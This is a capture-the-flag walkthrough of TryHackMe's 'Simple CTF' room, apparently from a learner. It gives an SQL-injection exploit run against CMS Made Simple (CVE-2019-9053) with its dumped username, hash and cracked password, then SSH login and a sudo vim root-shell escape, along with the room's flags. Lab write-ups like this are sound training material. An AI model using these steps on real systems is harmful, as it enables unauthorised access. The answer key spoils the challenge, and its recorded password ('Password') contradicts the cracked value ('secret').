# Simple CTF
https://tryhackme.com/room/easyctf


## How many services are running under port 1000?
Nmap scan of machine returns:
21/tcp  open  syn-ack vsftpd 3.0.3
80/tcp   open  Apache httpd 2.4.18 ((Ubuntu))

Answer: 2

## What is running on the higher port?
2222/tcp open  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

Answer: SSH

## What's the CVE you're using against the application? 
Gobuster scan returns:
/simple - CMS Made Simple version 2.2.8

Using searchsploit I check for potential vulns:
`searchsploit cms made simple 2.2.8`

Output: `CMS Made Simple < 2.2.10 - SQL Injection    php/webapps/46635.py`

Download exploit & copy to current dir:
`searchsploit -m php/webapps/46635.py ./46635.py`

Checked top of script for CVE reference:

Answer: CVE-2019-9053

## To what kind of vulnerability is the application vulnerable?
SQLI (SQL Injection) - As per title of CVE

## What's the password?
I downloaded 46635.py and modified it to run in python3 instead of python2 due to local my local setup and ran it using the following flags:
`python3 46635.py -u http://<ip>/simple/ --crack -w /usr/share/wordlists/rockyou_urf8.txt`

Output:
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```
Answer: Password

## Where can you login with the details obtained?
Answer: SSH

## What's the user flag?
Logged in via ssh, cat user.txt

Answer: G00d j0b, keep up!

## Is there any other user in the home directory? What's its name?
`ls /home`

Answer: sunbath

## What can you leverage to spawn a privileged shell?
`sudo -l` List available sudo privs

Output:     (root) NOPASSWD: /usr/bin/vim

Checked GTFO bins for potential privesc
`sudo vim -c ':!/bin/sh'`

Answer: vim

## What's the root flag?
Privesc to root user & cat root.txt

Answer: W3ll d0n3. You made it!
